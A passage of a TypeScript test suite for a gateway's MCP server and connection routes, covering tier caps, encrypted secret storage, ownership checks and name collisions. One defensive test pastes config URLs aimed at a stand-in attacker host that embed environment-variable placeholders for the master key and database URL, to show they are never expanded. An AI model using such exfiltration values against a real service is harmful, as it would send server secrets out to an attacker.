import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import type { FastifyInstance, InjectOptions } from "fastify";
import { newId, users, type Db } from "@ovid/db";
import { KNOWN_PROVIDER_IDS, PRO_REQUIRED_MESSAGE, createEnvelopeCrypto, parseMcpConfig } from "@ovid/mcp";
import { mcpServerDtoSchema, type McpServerDto } from "@ovid/shared";
import type { EncryptedEnvelope } from "@ovid/mcp";
import { buildGateway } from "../app.js";
import { closeDb, openTestDb, TEST_DATABASE_URL, testUid } from "../test/db.js";
import {
  authHeaders,
  noopEvents,
  stubKeys,
  stubMint,
  stubQueues,
  stubTickets,
  stubVerifier,
  stubSystemBus,
} from "../test/stubs.js";

// Explicit test-only supported manifest. These entries mirror the current
// descriptor prerequisites without claiming that any production row is ready.
vi.mock("@ovid/mcp", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@ovid/mcp")>();
  const tool = (name: string) => ({ name, description: `${name} test operation` });
  return {
    ...actual,
    CURATED_IDS: ["github", "jira", "s3", "supabase"],
    CURATED_MANIFEST: [
      {
        curatedId: "github",
        displayName: "GitHub",
        description: "Supported test GitHub entry",
        credentialFields: [{ key: "GITHUB_TOKEN", label: "GitHub token", secret: true }],
        tools: [tool("list_issues")],
      },
      {
        curatedId: "jira",
        displayName: "Jira",
        description: "Supported test Jira entry",
        credentialFields: [
          { key: "api_token", label: "Jira API token", secret: true },
          { key: "host", label: "Jira host", secret: false },
          { key: "email", label: "Jira email", secret: false },
        ],
        tools: [tool("search_issues")],
      },
      {
        curatedId: "s3",
        displayName: "S3",
        description: "Supported test S3 entry",
        credentialFields: [
          { key: "secret_access_key", label: "AWS secret access key", secret: true },
          { key: "access_key_id", label: "AWS access key ID", secret: false },
          { key: "region", label: "AWS region", secret: false },
          { key: "bucket", label: "S3 bucket", secret: false },
          { key: "session_token", label: "AWS STS session token", secret: true },
        ],
        tools: [tool("list_objects")],
      },
      {
        curatedId: "supabase",
        displayName: "Supabase",
        description: "Supported test Supabase entry",
        credentialFields: [
          { key: "user_jwt", label: "Supabase Auth user JWT", secret: true },
          { key: "publishable_key", label: "Supabase publishable key", secret: false },
          { key: "base_url", label: "Supabase project URL", secret: false },
          { key: "allowed_tables", label: "Allowed tables (comma-separated)", secret: false },
          { key: "allowed_columns", label: "Allowed projection columns (comma-separated)", secret: false },
        ],
        tools: [tool("select")],
      },
    ],
  };
});

// MCP server CRUD routes (P5 Task 15). Real Postgres (Task 8 tables) + the
// REAL envelope crypto with a fixed test key — the tests prove secrets are
// SEALED at rest (envelope in the row, no plaintext anywhere) and never
// projected in any response body.

const TEST_DATABASE_URL_ = TEST_DATABASE_URL;
const MASTER_KEY_HEX = "ab7d31c4e59f60a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f6071829";

const ENV_SECRET = "env-secret-9e1d33b7";
const HEADER_SECRET = "Bearer super-secret-token-4f7c29d1";
const CONNECTION_SECRET = "connection-secret-never-project-91a7";

interface GenerationChange {
  connectionId: string;
  userId: string;
  configVersion: number;
  disconnectGeneration: number;
}

describe.skipIf(!TEST_DATABASE_URL_)("gateway mcp server routes (real postgres)", () => {
  let db: Db;
  let app: FastifyInstance;
  const crypto = createEnvelopeCrypto(MASTER_KEY_HEX);
  const generationInvalidations: GenerationChange[] = [];

  beforeAll(async () => {
    db = await openTestDb();
    const gatewayDeps = {
      system: stubSystemBus(),
      db,
      queues: stubQueues().queues,
      verifier: stubVerifier(),
      tickets: stubTickets(),
      keys: stubKeys(),
      mint: stubMint(),
      events: noopEvents,
      crypto,
      connectionGenerationListener: {
        invalidate(change: GenerationChange) {
          generationInvalidations.push(change);
        },
      },
    };
    app = buildGateway(gatewayDeps);
  }, 60_000);

  afterAll(async () => {
    await app?.close();
    await closeDb(db);
  });

  async function seedTier(uid: string, tier: string): Promise<void> {
    await users.ensure(db, uid, `${uid}@stub.test`);
    await db.$client.unsafe("UPDATE users SET tier = $2 WHERE uid = $1", [uid, tier]);
  }

  async function seedPro(uid: string): Promise<void> {
    await seedTier(uid, "pro");
  }

  async function postServer(uid: string, payload: NonNullable<InjectOptions["payload"]>) {
    return app.inject({
      method: "POST",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
      payload,
    });
  }

  async function postConnection(uid: string, payload: NonNullable<InjectOptions["payload"]>) {
    return app.inject({
      method: "POST",
      url: "/cloud/v1/mcp/connections",
      headers: authHeaders(uid),
      payload,
    });
  }

  async function patchConnection(uid: string, id: string, payload: NonNullable<InjectOptions["payload"]>) {
    return app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${id}`,
      headers: authHeaders(uid),
      payload,
    });
  }

  async function patchServer(uid: string, id: string, payload: NonNullable<InjectOptions["payload"]>) {
    return app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${id}`,
      headers: authHeaders(uid),
      payload,
    });
  }

  it("POST custom as free → 402 pro_required with the exact PRO_REQUIRED_MESSAGE", async () => {
    const uid = testUid("mcp-free");
    const res = await postServer(uid, {
      name: "custom-http",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    expect(res.statusCode).toBe(402);
    expect(res.json()).toEqual({ error: { code: "pro_required", message: PRO_REQUIRED_MESSAGE } });
  });

  it("Go allows five custom connectors and refuses the sixth with the shared error code", async () => {
    const uid = testUid("mcp-go-cap");
    await seedTier(uid, "go");
    for (let index = 0; index < 5; index += 1) {
      const res = await postServer(uid, {
        name: `custom-${index}`,
        transport: "http",
        url: "https://mcp.example.test/mcp",
      });
      expect(res.statusCode, res.body).toBe(201);
    }
    const refused = await postServer(uid, {
      name: "custom-over-cap",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    expect(refused.statusCode).toBe(403);
    expect(refused.json().error.code).toBe("connector_limit_reached");
    const rows = await db.$client.unsafe(
      "SELECT id FROM mcp_servers WHERE user_id = $1 AND curated_id IS NULL",
      [uid],
    );
    expect(rows).toHaveLength(5);
  });

  it("a pasted batch over the plan cap is refused without a partial import", async () => {
    const uid = testUid("mcp-go-batch");
    await seedTier(uid, "go");
    const pasted = JSON.stringify({
      mcpServers: Object.fromEntries(
        Array.from({ length: 6 }, (_, index) => [
          `custom-${index}`,
          { command: "npx", args: ["-y", "some-mcp-server"] },
        ]),
      ),
    });
    const res = await postServer(uid, { pasted });
    expect(res.statusCode).toBe(403);
    expect(res.json().error.code).toBe("connector_limit_reached");
    const rows = await db.$client.unsafe(
      "SELECT id FROM mcp_servers WHERE user_id = $1",
      [uid],
    );
    expect(rows).toHaveLength(0);
  });

  it("parallel custom creates cannot race past the plan cap", async () => {
    const uid = testUid("mcp-go-race");
    await seedTier(uid, "go");
    const responses = await Promise.all(
      Array.from({ length: 10 }, (_, index) =>
        postServer(uid, {
          name: `custom-${index}`,
          transport: "http",
          url: "https://mcp.example.test/mcp",
        }),
      ),
    );
    expect(responses.filter((res) => res.statusCode === 201)).toHaveLength(5);
    expect(responses.filter((res) => res.statusCode === 403)).toHaveLength(5);
    const rows = await db.$client.unsafe(
      "SELECT id FROM mcp_servers WHERE user_id = $1 AND curated_id IS NULL",
      [uid],
    );
    expect(rows).toHaveLength(5);
  });

  it("POST custom as pro → 201; secrets sealed (no plaintext in row or response)", async () => {
    const uid = testUid("mcp-pro");
    await seedPro(uid);
    const res = await postServer(uid, {
      name: "custom-http",
      transport: "http",
      url: "https://mcp.example.test/mcp",
      env: { API_TOKEN: ENV_SECRET },
      headers: { authorization: HEADER_SECRET },
    });
    expect(res.statusCode).toBe(201);
    const dto = mcpServerDtoSchema.parse(res.json());
    expect(dto.name).toBe("custom-http");
    expect(dto.transport).toBe("http");
    expect(dto.url).toBe("https://mcp.example.test/mcp");
    expect(dto.enabled).toBe(true);
    expect(dto.curatedId).toBeNull();
    expect(dto.hasSecrets).toBe(true);
    expect(dto.needsAuth).toBe(true);

    // No secret value anywhere in the response.
    const body = JSON.stringify(res.json());
    expect(body).not.toContain(ENV_SECRET);
    expect(body).not.toContain(HEADER_SECRET);

    // The stored row holds a four-field envelope, never a plaintext column.
    const rows = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [dto.id],
    )) as { sealed: EncryptedEnvelope | null }[];
    expect(rows.length).toBe(1);
    expect(rows[0]!.sealed).not.toBeNull();
    const sealed = rows[0]!.sealed!;
    for (const field of ["wrappedDek", "iv", "ciphertext", "tag"] as const) {
      expect(typeof sealed[field]).toBe("string");
      expect(sealed[field].length).toBeGreaterThan(0);
    }
    expect(JSON.stringify(sealed)).not.toContain(ENV_SECRET);
    expect(JSON.stringify(sealed)).not.toContain(HEADER_SECRET);

    // Round-trip with the SAME master key + recordId proves the seal is the
    // pinned envelope crypto (recordId mcp_servers:{row.id}).
    const plain = JSON.parse(crypto.decrypt(sealed, `mcp_servers:${dto.id}`)) as {
      env?: Record<string, string>;
      headers?: Record<string, string>;
    };
    expect(plain.env?.API_TOKEN).toBe(ENV_SECRET);
    expect(plain.headers?.authorization).toBe(HEADER_SECRET);
  });

  it("POST pasted .mcp.json as pro parses via parseMcpConfig (stdio entry)", async () => {
    const uid = testUid("mcp-paste");
    await seedPro(uid);
    const pasted = JSON.stringify({
      mcpServers: {
        "my-stdio": {
          command: "npx",
          args: ["-y", "some-mcp-server"],
          env: { STDIO_KEY: "stdio-secret-77aa" },
        },
      },
    });
    const res = await postServer(uid, { pasted });
    expect(res.statusCode).toBe(201);
    const items = res.json() as unknown[];
    expect(Array.isArray(items)).toBe(true);
    expect(items.length).toBe(1);
    const dto = mcpServerDtoSchema.parse(items[0]);
    expect(dto.name).toBe("my-stdio");
    expect(dto.transport).toBe("stdio");
    expect(dto.command).toBe("npx");
    expect(dto.hasSecrets).toBe(true);
    expect(dto.needsAuth).toBe(false);
    expect(JSON.stringify(res.body)).not.toContain("stdio-secret-77aa");
  });

  it("POST curated credentials as FREE → 201 (curated is never tier-gated)", async () => {
    const uid = testUid("mcp-curated");
    // The curated row has a users FK; seed the user (curated stays ungated).
    await users.ensure(db, uid, `${uid}@stub.test`);
    const res = await postServer(uid, {
      curatedId: "github",
      secrets: { GITHUB_TOKEN: "ghp-curat-77bb" },
    });
    expect(res.statusCode).toBe(201);
    const dto = mcpServerDtoSchema.parse(res.json());
    expect(dto.curatedId).toBe("github");
    expect(dto.transport).toBe("native");
    expect(dto.hasSecrets).toBe(true);
    expect(dto.needsAuth).toBe(false);
    expect(JSON.stringify(res.body)).not.toContain("ghp-curat-77bb");

    // The sealed round-trip under mcp_servers:{row.id}. Curated credential
    // rows seal the FLAT map (the router's ctx.secrets contract, Task 11).
    const rows = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [dto.id],
    )) as { sealed: EncryptedEnvelope | null }[];
    const plain = JSON.parse(crypto.decrypt(rows[0]!.sealed!, `mcp_servers:${dto.id}`)) as {
      GITHUB_TOKEN?: string;
    };
    expect(plain.GITHUB_TOKEN).toBe("ghp-curat-77bb");
  });

  it("POST duplicate name → 409 server_exists", async () => {
    const uid = testUid("mcp-dup");
    await seedPro(uid);
    const payload = { name: "dup-server", transport: "http", url: "https://mcp.example.test/mcp" };
    const first = await postServer(uid, payload);
    expect(first.statusCode).toBe(201);
    const second = await postServer(uid, payload);
    expect(second.statusCode).toBe(409);
    expect(second.json()).toEqual({
      error: { code: "server_exists", message: "An MCP server with this name already exists." },
    });
  });

  it("GET list masks every secret; PATCH secrets REPLACE the sealed blob; enabled flips", async () => {
    const uid = testUid("mcp-patch");
    await seedPro(uid);
    const created = await postServer(uid, {
      name: "patched",
      transport: "http",
      url: "https://mcp.example.test/mcp",
      env: { API_TOKEN: "first-secret-11" },
    });
    const dto = mcpServerDtoSchema.parse(created.json());

    const list = await app.inject({
      method: "GET",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
    });
    expect(list.statusCode).toBe(200);
    for (const item of list.json() as unknown[]) mcpServerDtoSchema.parse(item);
    expect(JSON.stringify(list.body)).not.toContain("first-secret-11");

    // Secrets REPLACE: the new blob decrypts to the new value only.
    const patched = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
      payload: { secrets: { env: { API_TOKEN: "second-secret-22" } } },
    });
    expect(patched.statusCode).toBe(200);
    expect(mcpServerDtoSchema.parse(patched.json()).hasSecrets).toBe(true);
    const rows = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [dto.id],
    )) as { sealed: EncryptedEnvelope | null }[];
    const plain = JSON.parse(crypto.decrypt(rows[0]!.sealed!, `mcp_servers:${dto.id}`)) as {
      env?: Record<string, string>;
    };
    expect(plain.env?.API_TOKEN).toBe("second-secret-22");
    expect(JSON.stringify(plain)).not.toContain("first-secret-11");

    const disabled = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
      payload: { enabled: false },
    });
    expect(disabled.statusCode).toBe(200);
    expect(mcpServerDtoSchema.parse(disabled.json()).enabled).toBe(false);
  });

  it("wrong owner → 404 everywhere (get/patch/delete); DELETE removes", async () => {
    const uid = testUid("mcp-owner");
    const other = testUid("mcp-other");
    await seedPro(uid);
    await seedPro(other);
    const created = await postServer(uid, {
      name: "owned",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    const dto = mcpServerDtoSchema.parse(created.json());

    for (const method of ["GET", "PATCH", "DELETE"]) {
      const res = await app.inject({
        method,
        url: `/cloud/v1/mcp/servers/${dto.id}`,
        headers: authHeaders(other),
        ...(method === "PATCH" ? { payload: { enabled: false } } : {}),
      });
      expect(res.statusCode).toBe(404);
      expect(res.json()).toEqual({ error: { code: "not_found", message: "MCP server not found." } });
    }

    const removed = await app.inject({
      method: "DELETE",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
    });
    expect(removed.statusCode).toBe(204);
    const gone = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
    });
    expect(gone.statusCode).toBe(404);
  });

  it("POST/PATCH with secrets on a gateway composed WITHOUT crypto → 503 unavailable", async () => {
    const bare = buildGateway({
      system: stubSystemBus(),
      db,
      queues: stubQueues().queues,
      verifier: stubVerifier(),
      tickets: stubTickets(),
      keys: stubKeys(),
      mint: stubMint(),
      events: noopEvents,
    });
    const uid = testUid("mcp-nocrypto");
    await seedPro(uid);
    const res = await postServer(uid, {
      name: "no-crypto",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    // This app has no crypto — the sealing path must refuse loudly.
    const bareRes = await bare.inject({
      method: "POST",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
      payload: { name: "no-crypto", transport: "http", url: "https://mcp.example.test/mcp" },
    });
    expect(bareRes.statusCode).toBe(503);
    expect(bareRes.json()).toEqual({
      error: { code: "unavailable", message: "MCP secret sealing is not configured." },
    });
    expect(res.statusCode).toBe(201); // the crypto-wired app still works
    await bare.close();
  });

  it("POST pasted config NEVER interpolates the gateway process env (C1)", async () => {
    const uid = testUid("mcp-envleak");
    await seedPro(uid);

    // Plant secrets in the GATEWAY process env — the exact C1 vector.
    const plantedMasterKey = "planted-master-key-must-never-egress-4f2a";
    const plantedDatabaseUrl = "postgres://planted-db-secret@leak.test/ovid";
    const prevMasterKey = process.env.OVID_MASTER_KEY;
    const prevDatabaseUrl = process.env.DATABASE_URL;
    process.env.OVID_MASTER_KEY = plantedMasterKey;
    process.env.DATABASE_URL = plantedDatabaseUrl;
    try {
      const pasted = JSON.stringify({
        mcpServers: {
          "leak-master": { url: "https://attacker.test/?k=${OVID_MASTER_KEY}" },
          "leak-db": { url: "https://attacker.test/?d=${DATABASE_URL}" },
        },
      });
      const res = await postServer(uid, { pasted });
      expect(res.statusCode).toBe(201);

      // The 201 body keeps the placeholders LITERAL and never carries the
      // gateway's secret values.
      expect(res.body).toContain("${OVID_MASTER_KEY}");
      expect(res.body).toContain("${DATABASE_URL}");
      expect(res.body).not.toContain(plantedMasterKey);
      expect(res.body).not.toContain(plantedDatabaseUrl);

      // The stored plaintext config column is literal too.
      const rows = (await db.$client.unsafe(
        "SELECT name, config FROM mcp_servers WHERE user_id = $1 ORDER BY name",
        [uid],
      )) as { name: string; config: Record<string, unknown> }[];
      expect(rows.length).toBe(2);
      const stored = JSON.stringify(rows);
      expect(stored).toContain("${OVID_MASTER_KEY}");
      expect(stored).toContain("${DATABASE_URL}");
      expect(stored).not.toContain(plantedMasterKey);
      expect(stored).not.toContain(plantedDatabaseUrl);

      // A subsequent GET list is equally clean.
      const list = await app.inject({
        method: "GET",
        url: "/cloud/v1/mcp/servers",
        headers: authHeaders(uid),
      });
      expect(list.statusCode).toBe(200);
      expect(list.body).toContain("${OVID_MASTER_KEY}");
      expect(list.body).not.toContain(plantedMasterKey);
      expect(list.body).not.toContain(plantedDatabaseUrl);
    } finally {
      if (prevMasterKey === undefined) delete process.env.OVID_MASTER_KEY;
      else process.env.OVID_MASTER_KEY = prevMasterKey;
      if (prevDatabaseUrl === undefined) delete process.env.DATABASE_URL;
      else process.env.DATABASE_URL = prevDatabaseUrl;
    }
  });

  it("new connection contracts keep stable IDs, versioned envelopes, sealed secrets, and legacy arrays", async () => {
    const uid = testUid("connection-contract");
    await seedPro(uid);
    const res = await postConnection(uid, {
      providerId: "github",
      name: "GitHub connection",
      secrets: { GITHUB_TOKEN: CONNECTION_SECRET },
      agentEnabled: false,
    });
    expect(res.statusCode, res.body).toBe(201);
    const created = res.json();
    expect(created).toMatchObject({
      userId: uid,
      providerId: "github",
      enabled: true,
      agentEnabled: false,
      authState: "configured",
      healthState: "never_checked",
      lastCheckedAt: null,
      lastSuccessAt: null,
      configVersion: 1,
      disconnectGeneration: 0,
      name: "GitHub connection",
      transport: "native",
      hasSecrets: true,
    });
    expect(created.connectionId).toMatch(/^[0-9a-f-]{36}$/);
    for (const field of ["id", "curatedId", "config", "secrets", "secretsSealed", "secrets_sealed", "needsAuth"]) {
      expect(created).not.toHaveProperty(field);
    }
    expect(res.body).not.toContain(CONNECTION_SECRET);

    const stored = (await db.$client.unsafe(
      "SELECT provider_id, agent_enabled, secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [created.connectionId],
    )) as { provider_id: string; agent_enabled: boolean; sealed: EncryptedEnvelope }[];
    expect(stored).toHaveLength(1);
    expect(stored[0]).toMatchObject({ provider_id: "github", agent_enabled: false });
    expect(JSON.stringify(stored[0])).not.toContain(CONNECTION_SECRET);
    const plain = JSON.parse(crypto.decrypt(stored[0]!.sealed, `mcp_servers:${created.connectionId}`));
    expect(plain).toEqual({ GITHUB_TOKEN: CONNECTION_SECRET });

    const list = await app.inject({
      method: "GET",
      url: "/cloud/v1/mcp/connections",
      headers: authHeaders(uid),
    });
    expect(list.statusCode).toBe(200);
    expect(list.json()).toEqual({ contractVersion: 1, items: [created] });
    expect(list.body).not.toContain(CONNECTION_SECRET);

    const single = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/connections/${created.connectionId}`,
      headers: authHeaders(uid),
    });
    expect(single.statusCode).toBe(200);
    expect(single.json()).toEqual(created);

    const legacy = await app.inject({
      method: "GET",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
    });
    expect(legacy.statusCode).toBe(200);
    expect(Array.isArray(legacy.json())).toBe(true);
    expect(legacy.json()).toHaveLength(1);
    const legacyDto = mcpServerDtoSchema.parse(legacy.json()[0]);
    expect(legacyDto.id).toBe(created.connectionId);
    expect(legacyDto).not.toHaveProperty("connectionId");
    expect(legacyDto).not.toHaveProperty("providerId");
  });

  it("rejects every known unsupported provider ID instead of admitting it as custom", async () => {
    const uid = testUid("known-unsupported-admission");
    await seedPro(uid);
    const testSupported = new Set(["github", "jira", "s3", "supabase"]);
    for (const providerId of KNOWN_PROVIDER_IDS.filter((id) => !testSupported.has(id))) {
      const res = await postConnection(uid, {
        providerId,
        transport: "stdio",
        config: { command: "known-provider-must-not-become-custom" },
      });
      expect(res.statusCode, `${providerId}: ${res.body}`).toBe(409);
      expect(res.json().error.code).toBe("provider_unsupported");
    }
    expect(await db.$client.unsafe("SELECT id FROM mcp_servers WHERE user_id = $1", [uid])).toHaveLength(0);
  });

  it("reserves sanitized known namespaces in legacy and new admission without blocking genuine customs", async () => {
    const uid = testUid("known-namespace-admission");
    await seedPro(uid);

    const legacy = await postServer(uid, {
      name: "VerCeL!",
      transport: "http",
      url: "https://connector.example.test/mcp",
    });
    expect(legacy.statusCode, legacy.body).toBe(409);
    expect(legacy.json().error.code).toBe("server_exists");

    const legacyCurated = await postServer(uid, { curatedId: "vercel" });
    expect(legacyCurated.statusCode).toBe(400);

    const unicodeLegacy = await postServer(uid, {
      name: "verceℓ!",
      transport: "http",
      url: "https://unicode-legacy.example.test/mcp",
    });
    expect(unicodeLegacy.statusCode, unicodeLegacy.body).toBe(409);
    expect(unicodeLegacy.json().error.code).toBe("server_exists");

    const collision = await postConnection(uid, {
      providerId: "local-fetch-adapter",
      name: "Fetch!",
      transport: "stdio",
      config: { command: "local-fetch-adapter" },
    });
    expect(collision.statusCode, collision.body).toBe(409);
    expect(collision.json().error.code).toBe("server_exists");

    const unicodeCollision = await postConnection(uid, {
      providerId: "local-unicode-fetch-adapter",
      name: "fⓔtch!",
      transport: "stdio",
      config: { command: "local-unicode-fetch-adapter" },
    });
    expect(unicodeCollision.statusCode, unicodeCollision.body).toBe(409);
    expect(unicodeCollision.json().error.code).toBe("server_exists");

    const custom = await postConnection(uid, {
      providerId: "fetch-client",
      name: "Fetch Client",
      transport: "stdio",
      config: { command: "genuinely-custom-fetch-client" },
    });
    expect(custom.statusCode, custom.body).toBe(201);
    expect(custom.json()).toMatchObject({ providerId: "fetch-client", name: "Fetch Client" });
  });

  it("agrees with tool projection on NFC/NFD collisions without merging distinct names", async () => {
    const legacyUid = testUid("legacy-unicode-collision");
    await seedPro(legacyUid);
    const firstLegacy = await postServer(legacyUid, {
      name: "éclair",
      transport: "http",
      url: "https://unicode-one.example.test/mcp",
    });
    expect(firstLegacy.statusCode, firstLegacy.body).toBe(201);
    const decomposedLegacy = await postServer(legacyUid, {
      name: "e\u0301clair!",
      transport: "http",
      url: "https://unicode-two.example.test/mcp",
    });
    expect(decomposedLegacy.statusCode, decomposedLegacy.body).toBe(409);
    expect(decomposedLegacy.json().error.code).toBe("server_exists");
    const distinctLegacy = await postServer(legacyUid, {
      name: "eclair",
      transport: "http",
      url: "https://unicode-three.example.test/mcp",
    });
    expect(distinctLegacy.statusCode, distinctLegacy.body).toBe(201);

    const connectionUid = testUid("connection-unicode-collision");
    await seedPro(connectionUid);
    const firstConnection = await postConnection(connectionUid, {
      providerId: "custom-unicode-one",
      name: "éclair",
      transport: "stdio",
      config: { command: "custom-unicode-one" },
    });
    expect(firstConnection.statusCode, firstConnection.body).toBe(201);
    const decomposedConnection = await postConnection(connectionUid, {
      providerId: "custom-unicode-two",
      name: "e\u0301clair!",
      transport: "stdio",
      config: { command: "custom-unicode-two" },
    });
    expect(decomposedConnection.statusCode, decomposedConnection.body).toBe(409);
    expect(decomposedConnection.json().error.code).toBe("server_exists");
    const distinctConnection = await postConnection(connectionUid, {
      providerId: "custom-unicode-three",
      name: "eclair",
      transport: "stdio",
      config: { command: "custom-unicode-three" },
    });
    expect(distinctConnection.statusCode, distinctConnection.body).toBe(201);
  });

  it("serializes sanitized custom-name collisions in new transactional admission", async () => {
    const uid = testUid("connection-namespace-race");
    await seedPro(uid);
    const responses = await Promise.all([
      postConnection(uid, {
        providerId: "custom-one",
        name: "duplicate space",
        transport: "stdio",
        config: { command: "custom-one" },
      }),
      postConnection(uid, {
        providerId: "custom-two",
        name: "Duplicate Space!",
        transport: "stdio",
        config: { command: "custom-two" },
      }),
    ]);
    expect(responses.filter((res) => res.statusCode === 201)).toHaveLength(1);
    expect(responses.filter((res) => res.statusCode === 409)).toHaveLength(1);
    expect(responses.find((res) => res.statusCode === 409)?.json().error.code).toBe("server_exists");
    expect(await db.$client.unsafe("SELECT id FROM mcp_servers WHERE user_id = $1", [uid])).toHaveLength(1);
  });

  it("strictly denies create/patch extras and unsupported, unauthenticated, or disabled activation", async () => {
    const uid = testUid("connection-activation");
    await seedPro(uid);
    const unknown = await postConnection(uid, {
      providerId: "github",
      name: "Bad extra",
      unexpected: true,
    });
    expect(unknown.statusCode).toBe(400);
    const eager = await postConnection(uid, {
      providerId: "github",
      name: "Bad activation",
      agentEnabled: true,
    });
    expect(eager.statusCode).toBe(409);
    const plaintextConfigSecret = await postConnection(uid, {
      providerId: "unsupported-config-secret",
      name: "Secret in config",
      transport: "http",
      config: {
        url: "https://connector.example.test/mcp",
        headers: { authorization: CONNECTION_SECRET },
      },
    });
    expect(plaintextConfigSecret.statusCode).toBe(400);
    expect(plaintextConfigSecret.body).not.toContain(CONNECTION_SECRET);

    const unsupported = await postConnection(uid, {
      providerId: "unsupported-custom",
      name: "Custom HTTP",
      transport: "http",
      config: { url: "https://connector.example.test/mcp" },
    });
    expect(unsupported.statusCode, unsupported.body).toBe(201);
    expect(unsupported.json()).toMatchObject({
      providerId: "unsupported-custom",
      transport: "http",
      agentEnabled: false,
      authState: "needs_auth",
      healthState: "never_checked",
    });
    expect(unsupported.json()).not.toHaveProperty("config");
    expect(unsupported.json()).not.toHaveProperty("url");
    const unsupportedActivation = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${unsupported.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: true },
    });
    expect(unsupportedActivation.statusCode).toBe(409);
    expect(unsupportedActivation.json().error.code).toBe("provider_unsupported");

    const missing = await postConnection(uid, { providerId: "github", name: "GitHub missing auth" });
    expect(missing.statusCode).toBe(201);
    expect(missing.json()).toMatchObject({ authState: "missing", agentEnabled: false });
    const missingActivation = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${missing.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: true },
    });
    expect(missingActivation.statusCode).toBe(409);
    expect(missingActivation.json().error.code).toBe("auth_required");

    const supported = missing;
    const activated = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${supported.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: true, secrets: { GITHUB_TOKEN: CONNECTION_SECRET } },
    });
    expect(activated.statusCode, activated.body).toBe(200);
    expect(activated.json()).toMatchObject({
      agentEnabled: true,
      authState: "configured",
      healthState: "never_checked",
      configVersion: 2,
    });
    await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${supported.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: false },
    });
    const disabled = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${supported.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { enabled: false },
    });
    expect(disabled.json()).toMatchObject({ enabled: false, healthState: "disabled" });
    const disabledActivation = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${supported.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { agentEnabled: true },
    });
    expect(disabledActivation.statusCode).toBe(409);
    expect(disabledActivation.json().error.code).toBe("connection_disabled");
    const configPatch = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/connections/${supported.json().connectionId}`,
      headers: authHeaders(uid),
      payload: { config: { url: "https://not-allowed-in-patch.test" } },
    });
    expect(configPatch.statusCode).toBe(400);
  });

  it("rejects catalog-derived credential fields in config while preserving non-secret connection config", async () => {
    const attacks = [
      {
        providerId: "supabase",
        secret: "supabase-service-key-plaintext-51c2",
        payload: {
          providerId: "supabase",
          name: "Supabase plaintext service key",
          config: {
            base_url: "https://project.supabase.co",
            user_jwt: "supabase-service-key-plaintext-51c2",
          },
        },
      },
      {
        providerId: "s3",
        secret: "s3-secret-access-key-plaintext-81f4",
        payload: {
          providerId: "s3",
          name: "S3 plaintext secret key",
          config: {
            access_key_id: "AKIA-TEST-NONSECRET",
            region: "us-east-1",
            bucket: "connector-test-bucket",
            secret_access_key: "s3-secret-access-key-plaintext-81f4",
          },
        },
      },
      {
        providerId: "supabase",
        secret: "supabase-nested-service-key-plaintext-24d8",
        payload: {
          providerId: "supabase",
          name: "Supabase nested service key",
          config: {
            base_url: "https://project.supabase.co",
            nested: { userJwt: "supabase-nested-service-key-plaintext-24d8" },
          },
        },
      },
      {
        providerId: "custom-oauth-config",
        secret: "custom-oauth-token-plaintext-67b3",
        payload: {
          providerId: "custom-oauth-config",
          name: "Custom OAuth config",
          transport: "http",
          config: {
            url: "https://connector.example.test/mcp",
            oauth: { access_token: "custom-oauth-token-plaintext-67b3" },
          },
        },
      },
    ];
    const outcomes: Array<{ status: number; responseLeak: boolean; storedLeak: boolean; rows: number }> = [];
    for (const attack of attacks) {
      const uid = testUid(`config-secret-${attack.providerId}`);
      await seedPro(uid);
      const res = await postConnection(uid, attack.payload);
      const rows = await db.$client.unsafe("SELECT config, secrets_sealed FROM mcp_servers WHERE user_id = $1", [uid]);
      outcomes.push({
        status: res.statusCode,
        responseLeak: res.body.includes(attack.secret),
        storedLeak: JSON.stringify(rows).includes(attack.secret),
        rows: rows.length,
      });
    }
    expect(outcomes).toEqual(attacks.map(() => ({
      status: 400,
      responseLeak: false,
      storedLeak: false,
      rows: 0,
    })));

    const uid = testUid("supabase-legitimate-config");
    await seedPro(uid);
    const userJwt = "supabase-sealed-service-key-93c5";
    const legitimate = await postConnection(uid, {
      providerId: "supabase",
      name: "Supabase sealed split config",
      config: {
        base_url: "https://project.supabase.co",
        publishable_key: "sb_publishable_test_only",
        allowed_tables: "documents",
        allowed_columns: "id",
      },
